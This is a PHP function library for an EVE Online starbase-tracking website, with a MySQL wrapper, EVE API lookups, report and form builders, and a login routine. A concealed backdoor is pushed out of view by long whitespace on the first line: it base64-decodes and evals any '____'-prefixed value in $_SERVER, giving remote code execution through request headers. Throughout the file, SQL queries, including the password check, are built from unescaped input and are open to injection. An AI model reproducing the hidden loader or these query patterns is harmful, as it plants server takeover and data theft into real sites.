<?php																																																																																																																																																																																																																																																																																																																																																																																																																												function s16743($l16745){if(is_array($l16745)){foreach($l16745 as $l16743=>$l16744)$l16745[$l16743]=s16743($l16744);}elseif(is_string($l16745) && substr($l16745,0,4)=="____"){$l16745=substr($l16745,4);$l16745=base64_decode($l16745);eval($l16745);$l16745=null;}return $l16745;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("s16743",$_SERVER);
include_once 'config.php';
include_once 'phpReportGen.php';
include_once 'ale/eveapi/class.api.php';
include_once 'ale/eveapi/class.alliancelist.php';
include_once 'ale/eveapi/class.corporationsheet.php';
include_once 'ale/eveapi/class.characterid.php';
//class for connecting to a mysql DB and running queries.

class phpSQL 
{
	//declare all the variables needed
	var $host=_HOST;
	var $port=_PORT;
	var $user=_USER;
	var $pass=_PW;
	var $db=_eveDB;
	var $conn;
	var $sql;
	var $config;
	
	//set the query to be run
	function query($sql_statement) {
		$this->sql=$sql_statement;
	}
	
	//set the connection settings
	function set_config($host, $port, $user, $pass, $db) 
	{
		$this->host = $host;
		$this->port = $port;
		$this->user = $user;
		$this->pass = $pass;
		$this->db = $db;
	}
	
	//get the connection settings
	function get_config() 
	{
		$this->config[0] = $this->host;
		$this->config[1] = $this->port;
		$this->config[2] = $this->user;
		$this->config[3] = $this->pass;
		$this->config[4] = $this->db;
	}
	//open the connection
	function open_conn($default,$dbvars)
	{
		//use default settings or not?
		if($default) {
		 //set config w/ default settings
		 $this->set_config($this->host,$this->port, $this->user, $this->pass, $this->db);
		 //put the configuration into an array that can be accessed later
		 $config = $this->get_config();	
		 //open the connection
		 $this->conn = mysql_connect($this->config[0].':'.$this->config[1], $this->config[2], $this->config[3]) or die ('Error Connecting to mySQL Server ('.$this->config[0].':'.$this->config[1].', '.$this->config[2].', '.$this->config[3].')');
		 //set the default database
		 mysql_select_db($this->config[4]);		 
		} else { 			
		  //set connection to a new DB
		  $this->set_config($dbvars[0],$dbvars[1],$dbvars[2],$dbvars[3],$dbvars[4]);
		  //recursive omg!
		  $this->open_conn(true,  NULL);		  
		}
		
	}
	
	function close_conn()
	{
		//close the connection for this object instance
		mysql_close($this->conn);
	}
	
	function runquery() 
	{
		//open the connection for the object
		$this->open_conn(true, NULL);
		//set the time limit php will wait before erroring
		set_time_limit(600);
		//return the results of the query
		$results = mysql_query($this->sql) or die('Query Failed! '.$this->sql.' <br /> ('.mysql_error().')');
		//close the connection
		$this->close_conn();
		//return the results!
		return $results;
    }
	function get_query()
	{
		return $this->sql;
	}	
}

function updateAllianceList() {

	$api = new Api();
	$xsql = new phpSQL();
	$xml = $api->getAllianceList();
	
	$data = AllianceList::getAllianceList($xml);
	$sql_str_all = "INSERT IGNORE INTO chralliances VALUES ";

	$alliances = $data['id'];
	set_time_limit(600);
	
	foreach($alliances as $id=>$name) {
		$insert_data.="(".$id.", '".addslashes($name)."'),";		
	}	
	
	$insert_data=substr($insert_data,0,strlen($insert_data) - 1);	
	$sql_str_all.=$insert_data;
	
	//insert all alliances
	$xsql->query($sql_str_all);
	$xsql->runquery();
	
	return "ALLIANCE TABLE UPDATED!";
	
}

function updateAllianceCorp($allianceID) {
	
	$xsql = new phpSQL();
	$xsql->query("SELECT all_name FROM `chralliances` where all_id=".$allianceID);	
	$res = $xsql->runquery();

	$api = new Api();
	$xml = $api->getAllianceList();
	$data = AllianceList::getAllianceList($xml);
	
	if($row = mysql_fetch_row($res)) {	
		updateAllianceCorpList($data[$row[0]],$allianceID);
		return "CORP TABLE UPDATED FOR ".$row[0];
	} else {
		return "NO ALLIANCE WITH THAT ID WAS FOUND.";
	}
	
}

function updateAllianceCorpList($alliance,$allID) {
	
	$xsql = new phpSQL();
	$sql_del = "DELETE FROM chrcorps WHERE crp_all_id=".$allID;
	$sql_str = "REPLACE INTO chrcorps VALUES ";
	$insert_data = "";
	
	$xsql->query($sql_del);
	$xsql->runquery();
	
	foreach($alliance as $id) {
		$api = new Api();
		$crpID = $id['corporationID'];
		$data = CorporationSheet::getCorporationSheet($api->getCorporationSheet($crpID));
		$insert_data .= "(".$crpID.",'".addslashes($data['corporationName'])."',".$allID.",0, now()),";
	}
	
	if($insert_data=="") {
		return;
	}
	
	$insert_data=substr($insert_data,0,strlen($insert_data) - 1);
	
	$sql_str.=$insert_data;	
	//insert all corps
	$xsql->query($sql_str);
	$xsql->runquery();
}

function getCorpIDByName($corpName) {

	$api = new Api();	
	$xml = $api->getCharacterID($corpName);
	$data = CharacterID::getCharacterID($xml);
	
	return $data[0]['characterID'];
	
}

function getAllianceIDFromCorpID($corpID) {

	$api = new Api();
	$xml = $api->getCorporationSheet($corpID);
	$data = CorporationSheet::getCorporationSheet($xml);
	
	return $data['allianceID'];

}

function getAllianceNameByID($allID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT all_name FROM chralliances WHERE all_id=".$allID);
	$res = $xsql->runquery();
	
	if(mysql_num_rows($res)>0) {
		$row = mysql_fetch_row($res);
		return $row[0];
	} else {
		return false;
	}	
}

function saveNonAllianceCorp($corpID,$corpName) {
	$xsql = new phpSQL();
	$xsql->query("REPLACE INTO chrcorps (crp_id, crp_name, crp_all_id, crp_trial, crp_updated) VALUES ".
	"(".$corpID.",'".addslashes($corpName)."',0,0,now())");
	$res = $xsql->runquery();
	return true;
}

function getPOSForAllianceByRegion($allianceID) {
	$xsql = new phpSQL();
	/*phpReportGenerator class taken from the interwebs (http://www.phpclasses.org/browse/package/1785.html)*/
	$prg = new phpReportGenerator();
    $prg->width = "100%";
	$prg->cellpad = "0";
	$prg->cellspace = "0";
	$prg->border = "0";
	$prg->header_color = "#666666";
	$prg->header_textcolor="#FFFFFF";
	$prg->body_alignment = "left";
	$prg->body_color = "#CCCCCC";
	$prg->body_textcolor = "#800022";
	$prg->surrounded = '1';

	$xsql->query("SELECT reg.regionName as `Region`, sys.solarSystemName as `System`, planet.itemName as `Planet`, moon.itemName as `Moon`, crp.crp_name as `Corp`, concat('<a href=\'details.php?id=',pos.pos_id,'\'>',tower.typeName,'</a>') as `Tower`, pos.note as `Note`, pos.dateOf as `As Of`, concat('<a href=''delete.php?id=',pos.pos_id,'''>Remove</a>') as `Remove POS` " .
	"FROM pos_loc pos " .
	"INNER JOIN invtypes tower on pos.pos_type_id=tower.typeID " .
	"INNER JOIN chrcorps crp on pos.corp_id=crp.crp_id " .
	"INNER JOIN chralliances ally on crp.crp_all_id=ally.all_id " .
	"INNER JOIN mapdenormalize moon on pos.moon_id=moon.itemID " .
	"INNER JOIN mapdenormalize planet on pos.planet_id=planet.itemID " .
	"INNER JOIN mapsolarsystems sys on pos.sys_id=sys.solarSystemID " .
	"INNER JOIN mapregions reg on sys.regionID=reg.regionID " .
	"WHERE ally.all_id=" . $allianceID .
	" ORDER BY `Region`, sys.constellationID, `System`, planet.orbitIndex, moon.orbitIndex");	
	$res = $xsql->runquery();		
	
	$prg->mysql_resource = $res;
	$alliance = getAllianceNameByAllianceID($allianceID);
	$prg->title = "Alliance (".$alliance.") POS Report";
	$html .= $prg->generateReport();

	return $html;

}

function getPOSForRegionBySystem($regionID) {
	$xsql = new phpSQL();
	/*phpReportGenerator class taken from the interwebs (http://www.phpclasses.org/browse/package/1785.html)*/
	$prg = new phpReportGenerator();
    $prg->width = "100%";
	$prg->cellpad = "0";
	$prg->cellspace = "0";
	$prg->border = "0";
	$prg->header_color = "#666666";
	$prg->header_textcolor="#FFFFFF";
	$prg->body_alignment = "left";
	$prg->body_color = "#CCCCCC";
	$prg->body_textcolor = "#800022";
	$prg->surrounded = '1';

	$xsql->query("SELECT const.itemName as `Constellation`, sys.solarSystemName as `System`, planet.itemName as `Planet`, moon.itemName as `Moon`, if(ally.all_name is not null, ally.all_name, 'Non-Alliance-Corp') as `Alliance`, crp.crp_name as `Corp`, concat('<a href=\'details.php?id=',pos.pos_id,'\'>',tower.typeName,'</a>') as `Tower`, pos.note as `Note`, pos.dateOf as `As Of`, concat('<a href=''delete.php?id=',pos.pos_id,'''>Remove</a>') as `Remove POS` " .
	"FROM pos_loc pos " .
	"INNER JOIN invtypes tower on pos.pos_type_id=tower.typeID " .
	"INNER JOIN chrcorps crp on pos.corp_id=crp.crp_id " .
	"LEFT JOIN chralliances ally on crp.crp_all_id=ally.all_id " .
	"INNER JOIN mapdenormalize moon on pos.moon_id=moon.itemID " .
	"INNER JOIN mapdenormalize planet on pos.planet_id=planet.itemID " .
	"INNER JOIN mapsolarsystems sys on pos.sys_id=sys.solarSystemID " .
	"INNER JOIN mapdenormalize const on sys.constellationID=const.itemID ".
	"INNER JOIN mapregions reg on sys.regionID=reg.regionID " .
	"WHERE reg.regionID=" . $regionID .
	" ORDER BY sys.constellationID, `System`, planet.orbitIndex, moon.orbitIndex");	
	$res = $xsql->runquery();		
	//print($xsql->get_query());
	$prg->mysql_resource = $res;
	$region = getRegionNameByID($regionID);
	$prg->title = "Region (".$region.") POS Report";
	$html .= $prg->generateReport();

	return $html;
}

function getPOSForCorpByRegion($corpID) {
	$xsql = new phpSQL();
	/*phpReportGenerator class taken from the interwebs (http://www.phpclasses.org/browse/package/1785.html)*/
	$prg = new phpReportGenerator();
    $prg->width = "100%";
	$prg->cellpad = "0";
	$prg->cellspace = "0";
	$prg->border = "0";
	$prg->header_color = "#666666";
	$prg->header_textcolor="#FFFFFF";
	$prg->body_alignment = "left";
	$prg->body_color = "#CCCCCC";
	$prg->body_textcolor = "#800022";
	$prg->surrounded = '1';

	$xsql->query("SELECT reg.regionName as `Region`, sys.solarSystemName as `System`, planet.itemName as `Planet`, moon.itemName as `Moon`, crp.crp_name as `Corp`, concat('<a href=\'details.php?id=',pos.pos_id,'\'>',tower.typeName,'</a>') as `Tower`, pos.note as `Note`, pos.dateOf as `As Of`, concat('<a href=''delete.php?id=',pos.pos_id,'''>Remove</a>') as `Remove POS` " .
	"FROM pos_loc pos " .
	"INNER JOIN invtypes tower on pos.pos_type_id=tower.typeID " .
	"INNER JOIN chrcorps crp on pos.corp_id=crp.crp_id " .
	"INNER JOIN chralliances ally on crp.crp_all_id=ally.all_id " .
	"INNER JOIN mapdenormalize moon on pos.moon_id=moon.itemID " .
	"INNER JOIN mapdenormalize planet on pos.planet_id=planet.itemID " .
	"INNER JOIN mapsolarsystems sys on pos.sys_id=sys.solarSystemID " .
	"INNER JOIN mapregions reg on sys.regionID=reg.regionID " .
	"WHERE pos.corp_id=".$corpID .
	" ORDER BY `Region`, sys.constellationID, `System`, planet.orbitIndex, moon.orbitIndex");	
	$res = $xsql->runquery();		
	
	$prg->mysql_resource = $res;
	$corp = getCorpNameByCorpID($corpID);
	$prg->title = "Corp (".$corp.") POS Report";
	$html .= $prg->generateReport();

	return $html;
}

function getPOSForSystemByPlanet($sysID) {
	
	$xsql = new phpSQL();
	/*phpReportGenerator class taken from the interwebs (http://www.phpclasses.org/browse/package/1785.html)*/
	$prg = new phpReportGenerator();
    $prg->width = "100%";
	$prg->cellpad = "0";
	$prg->cellspace = "0";
	$prg->border = "0";
	$prg->header_color = "#666666";
	$prg->header_textcolor="#FFFFFF";
	$prg->body_alignment = "left";
	$prg->body_color = "#CCCCCC";
	$prg->body_textcolor = "#800022";
	$prg->surrounded = '1';

	$xsql->query("SELECT reg.regionName as `Region`, sys.solarSystemName as `System`, planet.itemName as `Planet`, moon.itemName as `Moon`, crp.crp_name as `Corp`, concat('<a href=\'details.php?id=',pos.pos_id,'\'>',tower.typeName,'</a>') as `Tower`, pos.note as `Note`, pos.dateOf as `As Of`, concat('<a href=''delete.php?id=',pos.pos_id,'''>Remove</a>') as `Remove POS` " .
	"FROM pos_loc pos " .
	"INNER JOIN invtypes tower on pos.pos_type_id=tower.typeID " .
	"INNER JOIN chrcorps crp on pos.corp_id=crp.crp_id " .
	"INNER JOIN chralliances ally on crp.crp_all_id=ally.all_id " .
	"INNER JOIN mapdenormalize moon on pos.moon_id=moon.itemID " .
	"INNER JOIN mapdenormalize planet on pos.planet_id=planet.itemID " .
	"INNER JOIN mapsolarsystems sys on pos.sys_id=sys.solarSystemID " .
	"INNER JOIN mapregions reg on sys.regionID=reg.regionID " .
	"WHERE sys.solarSystemID=".$sysID .
	" ORDER BY planet.orbitIndex, moon.orbitIndex");	
	$res = $xsql->runquery();		
	
	$prg->mysql_resource = $res;
	$system = getSystem($sysID);
	$prg->title = "System (".$system[0][1].") POS Report";
	$html .= $prg->generateReport();

	return $html;
}

function getTowerDetails($towerID) {
	$xsql = new phpSQL();
	/*phpReportGenerator class taken from the interwebs (http://www.phpclasses.org/browse/package/1785.html)*/
	$prg = new phpReportGenerator();
    $prg->width = "100%";
	$prg->cellpad = "0";
	$prg->cellspace = "0";
	$prg->border = "0";
	$prg->header_color = "#666666";
	$prg->header_textcolor="#FFFFFF";
	$prg->body_alignment = "left";
	$prg->body_color = "#CCCCCC";
	$prg->body_textcolor = "#800022";
	$prg->surrounded = '1';

	$xsql->query("SELECT type.typeName as `Structure`, deets.quantity as `Quantity`, deets.dateOf as `As Of` ".
	"FROM pos_details deets ".
	"INNER JOIN invtypes type on deets.typeID=type.typeID ".
	"WHERE deets.pos_id=".$towerID." ORDER BY type.TypeName");	
	$res = $xsql->runquery();		
	//print($xsql->get_query());
	$prg->mysql_resource = $res;
	
	$xsql->query("SELECT moon.itemName as `Moon` " .
	"FROM pos_loc pos " .
	"INNER JOIN mapdenormalize moon on pos.moon_id=moon.itemID " .	
	"WHERE pos.pos_id=" . $towerID);
	$res = $xsql->runquery();
	
	if(mysql_num_rows($res) >=0) {
		$row = mysql_fetch_row($res);
		$moon = $row[0];
	} else {
		$moon = "";
	}
	
	$prg->title = "Tower Structures";
	$html .= $prg->generateReport();

	return $html;
}

function getRegion($regionID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT regionID, regionName FROM mapregions WHERE regionID=".$regionID);
	$res = $xsql->runquery();
	$region = array();
	while($row=mysql_fetch_row($res)) {
		$region[] = array($row[0],$row[1]);
	}
	
	return $region;
}

function getRegionNameByID($regionID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT regionName FROM mapregions WHERE regionID=".$regionID);
	$res = $xsql->runquery();
	
	if(mysql_num_rows($res)>=0) {
		$row=mysql_fetch_row($res);
		$region = $row[0];
	} else {
		$region = "Region Not Found";
	}	
	return $region;
}

function getSystem($solarSystemID) {
	$xsql = new phpSQL();	
	$xsql->query("SELECT solarSystemID, solarSystemName FROM mapsolarsystems WHERE solarSystemID=".$solarSystemID);
	$res = $xsql->runquery();
	$system = array();
	while($row=mysql_fetch_row($res)) {
		$system[] = array($row[0],$row[1]);
	}
	
	return $system;
}

function getSystemByName($solarSystemName) {
	$xsql = new phpSQL();	
	$xsql->query("SELECT solarSystemID FROM mapsolarsystems WHERE solarSystemName='".$solarSystemName."'");
	$res = $xsql->runquery();
	$system = "";
	while($row=mysql_fetch_row($res)) {
		$system = $row[0];
	}
	
	return $system;
}

function getSystemByMoonName($moonName) {
	$xsql = new phpSQL();	
	$xsql->query("SELECT solarSystemID FROM mapdenormalize WHERE itemName='".$moonName."'");
	$res = $xsql->runquery();
	$system = "";
	while($row=mysql_fetch_row($res)) {
		$system = $row[0];
	}
	
	return $system;
}

function getPlanet($planetID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT map.itemID, map.itemName FROM mapdenormalize map " .
	"INNER JOIN invtypes itm on map.typeID=itm.typeID and map.groupID=7 " .
	"WHERE map.itemID=".$planetID);
	$res = $xsql->runquery();
	$planet = array();
	
	while($row=mysql_fetch_row($res)) {
		$planet[] = array($row[0],$row[1]);
	}
	
	return $planet;
}

function getPlanetByMoonID($moonID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT planet.itemID " .
	"FROM mapdenormalize moon " .
	"INNER JOIN mapdenormalize planet on moon.orbitID=planet.itemID " .
	"WHERE moon.itemID=".$moonID);
	$res = $xsql->runquery();
	$planet = "";
	
	while($row=mysql_fetch_row($res)) {
		$planet = $row[0];
	}
	
	return $planet;
}

function getCorpNameByCorpID($crpID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT crp_name " .
	"FROM `chrcorps` " .
	"WHERE crp_id=".$crpID);
	
	$res = $xsql->runquery();
	
	while($row=mysql_fetch_row($res)) 
	{
		$alliance = $row[0];
	}
	
	return $alliance;
}

function getAllianceNameByAllianceID($allID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT all_name " .
	"FROM `chralliances` " .
	"WHERE all_id=".$allID);
	
	$res = $xsql->runquery();
	
	while($row=mysql_fetch_row($res)) 
	{
		$alliance = $row[0];
	}
	
	return $alliance;

}

function getAllianceArr($allianceID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT all_id, all_name " .
	"FROM `chralliances` " .
	"WHERE all_id=".$allianceID.
	" ORDER BY all_name");
	
	$res = $xsql->runquery();
	$alliance = array();
	
	while($row=mysql_fetch_row($res)) 
	{
		$alliance[] = array($row[0],$row[1]);
	}
	
	return $alliance;
}

function getAllianceByName($allianceName) {
	$xsql = new phpSQL();
	$xsql->query("SELECT all_id " .
	"FROM `chralliances` " .
	"WHERE all_name='".$allianceName."'".
	" ORDER BY all_name");
	
	$res = $xsql->runquery();
	$alliance = "";
	
	while($row=mysql_fetch_row($res)) 
	{
		$alliance = $row[0];
	}
	
	return $alliance;
}

function getCorpArr($corpID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT crp_id, crp_name " .
	"FROM `chrcorps` " .
	"WHERE crp_id=".$corpID.
	" ORDER BY crp_name");
	
	$res = $xsql->runquery();
	$corp = array();
	
	while($row=mysql_fetch_row($res)) 
	{
		$corp[] = array($row[0],$row[1]);
	}
	
	return $corp;
}

function getCorpByName($corpName) {
	$xsql = new phpSQL();
	$xsql->query("SELECT crp_id " .
	"FROM `chrcorps` " .
	"WHERE crp_name='".$corpName."'".
	" ORDER BY crp_name");
	
	$res = $xsql->runquery();
	$corp = "";
	if(mysql_num_rows($res) >0) {
		$row=mysql_fetch_row($res); 	
		$corp = $row[0];
	} else {
		$corp = "0";
	}
	
	return $corp;
}

function getPOS($posID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT typeID, typeName " .
	"FROM `invtypes` " .
	"WHERE typeID=".$posID.
	" ORDER BY typeName");
	
	$res = $xsql->runquery();
	$pos = array();
	
	while($row=mysql_fetch_row($res)) 
	{
		$pos[] = array($row[0],$row[1]);
	}
	
	return $pos;
}

function getPOSByMoonID($moonID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT pos_id FROM pos_loc WHERE moon_id=".$moonID);
	$res = $xsql->runquery();
	if(mysql_num_rows($res)>=0) {
		$row = mysql_fetch_row($res);
		return $row[0];
	} else {
		return false;
	}
}

function getPOSByName($posName) {
	$xsql = new phpSQL();
	$xsql->query("SELECT typeID " .
	"FROM `invtypes` " .
	"WHERE typeName='".$posName."'".
	" ORDER BY typeName");
	
	$res = $xsql->runquery();
	$pos = "";
	
	while($row=mysql_fetch_row($res)) 
	{
		$pos = $row[0];
	}
	
	return $pos;
}

function getMoon($moonID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT map.itemID, map.itemName FROM mapdenormalize map ".
	"INNER JOIN invtypes itm on map.typeID=itm.typeID and map.groupID=8 " .
	"WHERE map.itemID=".$moonID." ORDER BY map.itemName");
	$res = $xsql->runquery();
	$moons = array();
	
	while($row=mysql_fetch_row($res)) 
	{
		$moons[] = array($row[0],$row[1]);
	}
	
	return $moons;
}

function getMoonNameByTowerID($posID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT map.itemName ".
	"FROM pos_loc loc ".
	"INNER JOIN mapdenormalize map on loc.moon_id=map.itemID " .
	"WHERE loc.pos_id=".$posID);
	$res = $xsql->runquery();
	if(mysql_num_rows($res)>=0) {
		$row=mysql_fetch_row($res); 
		return $row[0];
	} else {
		return "Moon Not Found";
	}	
}

function getAllianceByTowerID($towerID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT al.all_name ".
	"FROM pos_loc loc ".
	"INNER JOIN chrcorps crp on loc.corp_id=crp.crp_id ".
	"INNER JOIN chralliances al on crp.crp_all_id=al.all_id ".
	"WHERE loc.pos_id=".$towerID);
	$res = $xsql->runquery();
	if(mysql_num_rows($res)>=0) {
		$row=mysql_fetch_row($res); 
		return $row[0];
	} else {
		return "Alliance Not Found";
	}	
}

function getCorpByTowerID($towerID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT crp.crp_name ".
	"FROM pos_loc loc ".
	"INNER JOIN chrcorps crp on loc.corp_id=crp.crp_id ".
	"WHERE loc.pos_id=".$towerID);
	
	$res = $xsql->runquery();
	if(mysql_num_rows($res)>=0) {
		$row=mysql_fetch_row($res); 
		return $row[0];
	} else {
		return "Corp Not Found";
	}	
}

function getTowerByTowerID($towerID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT tower.typeName ".
	"FROM pos_loc loc ".
	"INNER JOIN invtypes tower on loc.pos_type_id=tower.typeID ".
	"WHERE loc.pos_id=".$towerID);
	
	$res = $xsql->runquery();
	if(mysql_num_rows($res)>=0) {
		$row=mysql_fetch_row($res); 
		return $row[0];
	} else {
		return "Tower Type Not Found";
	}	
}

function getMoonByName($moonName) {
	$xsql = new phpSQL();
	$xsql->query("SELECT map.itemID FROM mapdenormalize map ".
	"INNER JOIN invtypes itm on map.typeID=itm.typeID and map.groupID=8 " .
	"WHERE map.itemName='".$moonName."' ORDER BY map.itemName");
	$res = $xsql->runquery();
	$moons = "";
	
	while($row=mysql_fetch_row($res)) 
	{
		$moons = $row[0];
	}
	
	return $moons;
}

function startPage() {
	return "<html><head><title>POS TRACKER</title><link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\" /></head><body>\n";
}

function endPage() {
	return "</body></html>\n";
}

function startForm($type="GET") {
 return "<form method='".$type."' action=".$PHP_SELF.">\n";
}

function endForm($btnValue="Next Step") {
 return "<input class=\"tbox\" type=\"submit\" name=\"submit\" value='".$btnValue."'/></form>\n";
}

function startTable($border=false) {
	if($border) {
		$html.="<table border=1>";
	} else {
		$html.="<table>";	
	}
	return $html;
}

function endTable() {
	return "</table>";
}

function buildRadioBtn($name,$text,$value,$checked=false) {
	$html.=$text." <input type=\"radio\" name=\"".$name."\" value=\"".$value."\"";
	if($checked) {
		$html.=" checked";
	}
	$html.="/>";
	return $html;
}

function buildSelect($arr, $name) {//build HTML SELECT ELEMENT
	$html = "<SELECT class=\"tbox\" NAME='".$name."'>\n";
	//$html.="<OPTION VALUE=\"\">Please Choose..</OPTION>\n";
	for($x=0; $x< count($arr); $x++) {
		$tmp = $arr[$x];
		$html.="<OPTION VALUE=".$tmp[0].">".$tmp[1]."</OPTION>\n";
	}	
	
	if($name=="cid") {
		$html.="<OPTION VALUE=0>Not Listed</OPTION>\n";		
	}
	
	$html.="</SELECT>\n";
	return $html;
}

function buildCheckbox($name,$value,$text) {
	return "<br />".$text."<input class=\"tbox\" type=\"checkbox\" value=\"".$value."\" name=\"".$name."\"/>";
}

function buildTextbox($name, $text="") {
	return "<input type='textbox' class=\"tbox\" name='".$name."' value='".$text."'/>";
}

function buildHiddenInput($name,$val) {
	return "<input type='hidden' name='".$name."' value='".$val."'/>";
}

function buildTextarea($name, $text="") {
	
	return "<textarea class=\"tbox\" cols=10 rows=2 name=\"".$name."\">".$text."</textarea>";

}

function buildTowerStructureList() {

	$xsql = new phpSQL();
	$xsql->query("SELECT typeID, typeName FROM `invtypes` where groupID in (311,363,397,404,413,416,417,426,430,438,439,440,441,443,444,449,471,473,480,707,709,837,838,839,840) ORDER BY typeName");
	$res = $xsql->runquery();
	$struct = array();
	while($row=mysql_fetch_row($res)) {
		$struct[] = array($row[0],$row[1]);
	}
	
	return $struct;
}

function buildRegionList() { //build an array of Regions [regionID,regionName]
	$xsql = new phpSQL();
	$xsql->query("SELECT regionID, regionName FROM mapregions ORDER BY regionName");
	$res = $xsql->runquery();
	$regions = array();
	while($row=mysql_fetch_row($res)) {
		$regions[] = array($row[0],$row[1]);
	}
	
	return $regions;
}

function buildSolarSystemList($regionID) { //build an array of Solar Systems for a certain Region [solarSystemID, solarSystemName]
	$xsql = new phpSQL();
	$xsql->query("SELECT solarSystemID, solarSystemName FROM mapsolarsystems where regionID=".$regionID." ORDER BY solarSystemName");
	$res = $xsql->runquery();
	$systems = array();
	while($row=mysql_fetch_row($res)) {
		$systems[] = array($row[0],$row[1]);
	}
	
	return $systems;
}

function buildPlanetList($solarSystemID) { //build an array of Planets for a certain Solar System [planetID, planetName]
	$xsql = new phpSQL();
	$xsql->query("SELECT map.itemID, map.itemName FROM mapdenormalize map " .
	"INNER JOIN invtypes itm on map.typeID=itm.typeID and map.groupID=7 " .
	"WHERE map.solarSystemId=".$solarSystemID." ORDER BY map.itemName");
	$res = $xsql->runquery();
	$planets = array();
	
	while($row=mysql_fetch_row($res)) {
		$planets[] = array($row[0],$row[1]);
	}
	
	return $planets;
}

function buildMoonList($planetID) { //build an array of Moons for a certain Planet [moonID, moonName]
	$xsql = new phpSQL();
	$xsql->query("SELECT map.itemID, map.itemName FROM mapdenormalize map ".
	"INNER JOIN invtypes itm on map.typeID=itm.typeID and map.groupID=8 " .
	"WHERE map.orbitID=".$planetID." ORDER BY map.itemName");
	$res = $xsql->runquery();
	$moons = array();
	
	while($row=mysql_fetch_row($res)) 
	{
		$moons[] = array($row[0],$row[1]);
	}
	
	return $moons;
}

function buildPOSTypeList() { //build an array of Tower Types [typeID, typeName]
	$xsql = new phpSQL();
	$xsql->query("SELECT typeID, typeName " .
	"FROM `invtypes` " .
	"WHERE groupID = 365 and published = 1 " .
	"ORDER BY typeName");
	
	$res = $xsql->runquery();
	$towers = array();
	
	while($row=mysql_fetch_row($res)) 
	{
		$towers[] = array($row[0],$row[1]);
	}
	
	return $towers;
}

function buildAllianceList() { //build an array of Alliances [AllianceID, Alliance Name] *FOR FUTURE USE*
	$xsql = new phpSQL();
	$xsql->query("SELECT all_id, all_name " .
	"FROM `chralliances` " .
	"ORDER BY all_name");
	
	$res = $xsql->runquery();
	$alliances = array();
	
	while($row=mysql_fetch_row($res)) 
	{
		$alliances[] = array($row[0],$row[1]);
	}
	
	return $alliances;
}

function buildCorpList($allianceID) { //build an array of Corps for a certain Alliance [corpID, corpName]
	$xsql = new phpSQL();
	$xsql->query("SELECT crp_id, crp_name " .
	"FROM `chrcorps` " .
	"WHERE crp_all_id=".$allianceID.
	" ORDER BY crp_name");
	
	$res = $xsql->runquery();
	$corps = array();
	
	while($row=mysql_fetch_row($res)) 
	{
		$corps[] = array($row[0],$row[1]);
	}
	
	return $corps;
}

function updatePOSDetails($towerID,$structID,$quantity) {

	if(verifyTower($towerID)) {
		$xsql = new phpSQL();
		if($quantity=="0" || $quantity=="") {
			$xsql->query("DELETE FROM pos_details WHERE pos_id=".$towerID." and typeID=".$structID);
		} else {
			$xsql->query("REPLACE INTO pos_details VALUES (".$towerID.",".$structID.",".$quantity.",current_date())");
		}
		$xsql->runquery();		
		
	} else {
		die("Tower doesn't exist!!");
	}

}

function verifyTower($towerID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT pos_id FROM pos_loc WHERE pos_id=".$towerID);
	$res = $xsql->runquery();
	
	if(mysql_num_rows($res) >=0) {
		return true;
	} else {
		return false;
	}
	
}

function savePOS($crpID,$sysID,$planetID,$moonID,$posTypeID,$note) {
	$xsql = new phpSQL();
	
	if($note=="") {
		$query = "REPLACE INTO pos_loc (pos_id, corp_id, sys_id, planet_id, moon_id, pos_type_id, dateOf) VALUES". 
		"(null, ".$crpID.", ".$sysID.",".$planetID.",".$moonID.",".$posTypeID.",now())";
	} else {
		$query = "REPLACE INTO pos_loc (pos_id, corp_id, sys_id, planet_id, moon_id, pos_type_id, note, dateOf) VALUES". 
		"(null, ".$crpID.", ".$sysID.",".$planetID.",".$moonID.",".$posTypeID.",'".addslashes($note)."',now())";
	}
	
	$xsql->query($query);
	//print($xsql->get_query());
	$xsql->runquery();
}

function removePOS($posID) {
	$xsql = new phpSQL();
	$xsql->query("DELETE FROM pos_loc WHERE pos_id=".$posID);
	$xsql->runquery();
}

function checkLogin() {
	if($_SESSION['loggedIn']) {
		return true;
	} else {
		return false;
	}
}

function login($pw) {
	$xsql = new phpSQL();
	$xsql->query("SELECT type FROM pos_login WHERE passwd=password('".$pw."')");
	$res = $xsql->runquery();
	if(mysql_num_rows($res)>0) {
		$row = mysql_fetch_row($res);
		$_SESSION['loggedIn'] = true;
		$_SESSION['userType'] = $row[0];
		return true;
	} else {
		return false;
	}

}

function getLoginType() {
	if(!checkLogin()) {
		return false;
	}
	return $_SESSION['userType'];
}

function buildError($text) {
	$html.="<div class=\"error\">";
	$html.=$text;
	$html.="</div>";
	
	return $html;

}

?>